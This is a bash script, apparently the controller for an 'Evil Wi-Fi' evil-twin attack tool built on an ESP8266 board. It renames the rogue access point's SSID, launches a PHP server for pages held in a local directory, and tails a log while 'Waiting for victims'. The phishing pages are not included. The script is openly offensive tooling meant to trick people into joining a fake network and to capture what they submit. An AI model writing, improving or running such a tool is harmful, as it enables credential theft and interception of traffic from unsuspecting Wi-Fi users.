#!/bin/bash

banner() {
   clear
    echo -e "\033[1;31m   __       _ _ __    __ _  __ _"
    echo -e "  /__\_   _(_) / / /\ \ (_)/ _(_)"
    echo -e " /_\ \ \ / / | \ \/  \/ / | |_| |"
    echo -e "//__  \ V /| | |\  /\  /| |  _| |"
    echo -e "\\__/   \_/ |_|_| \/  \/ |_|_| |_|"
    echo
    echo -e "\e[1;32m  The Evil Wi-Fi Network"
    echo -e "\e[1;32m  GitHub: http://github.com/T3rr8us-P4nk"
    echo -e "\e[1;32m  Facebook: https://www.facebook.com/T3rr8usP4nk"
    echo
}
check_esp8266_connection() {
    ESP_IP="$1"
    ping -c 1 -W 2 "$ESP_IP" > /dev/null 2>&1
    if [ $? -eq 0 ]; then
        echo "\033[1;34mConnected"
    else
        echo "\033[1;31mNot connected"
    fi
}


change_ssid_option() {
    echo -e "\033[1;36mStatus:\033[1;31m $(check_esp8266_connection)"
    read -p "Enter new SSID: " new_ssid

    if [ -n "$new_ssid" ]; then
        new_ssid=$(echo "$new_ssid" | tr -d ' ')

        echo "Changing SSID to $new_ssid..."
        curl -s "http://192.168.1.1/setting?ssid=$new_ssid" > /dev/null
        echo "SSID changed to $new_ssid"
        echo "ESP8266 is restarting..."
        echo "Reconnect to ESP8266..."
        sleep 5
    else
        echo -e " \033[1;91m[!]\033[0m Enter a valid SSID!"
        sleep 3
    fi
}

print_data() {
    local line="$1"
    echo -e "$line"
}

phpserver() {
    local directory="$1"
    echo -e "Starting php server..."
    php -S 192.168.1.100:8080 -t "$directory" >/dev/null 2>&1

    if [ $? -ne 0 ]; then
        echo -e "Error: Something went wrong"
    fi
}

read_main_log() {
    local log_file="server/logs/log.txt"

    tail -f "$log_file" | while IFS= read -r line; do
        print_data "$line"
    done
}

start_server() {
    clear
    banner
    echo -e "\033[1;36mStatus:\033[1;31m $(check_esp8266_connection)"
    echo
    # Start the PHP server
    phpserver "server" &
    sleep 1
    echo -e "Waiting for victims...\n"
    sleep 3
    read_main_log
}

option_menu() {
    echo -e "\033[1;36mStatus:\033[1;31m $(check_esp8266_connection)"
    echo
    echo -e "\033[1;36mOptions:\033[0m"
    echo -e "\033[1;32m[1] Change SSID  [2] Start Server\033[0m"
    echo -e "\033[1;32m[3] Check Logs  [4] Exit\033[0m"
}

main() {
    banner
    option_menu
    echo
    read -p "Select Option: " selected_option

    if [ "$selected_option" == "1" ]; then
        change_ssid_option

    elif [ "$selected_option" == "2" ]; then
        start_server

    elif [ "$selected_option" == "3" ]; then
    echo
    while read -r line; do
        print_data "$line"
    done < "server/logs/log.txt"
    echo
    read -p "Press Enter to go back..."
    main

    elif [ "$selected_option" == "4" ]; then
        echo -e "\033[1;31mExiting..."
        sleep 1
        exit
        echo
    else
        sleep 1
        echo -e "\033[1;91mInvalid option\033[0m"
        sleep 1
        main
fi

}

main
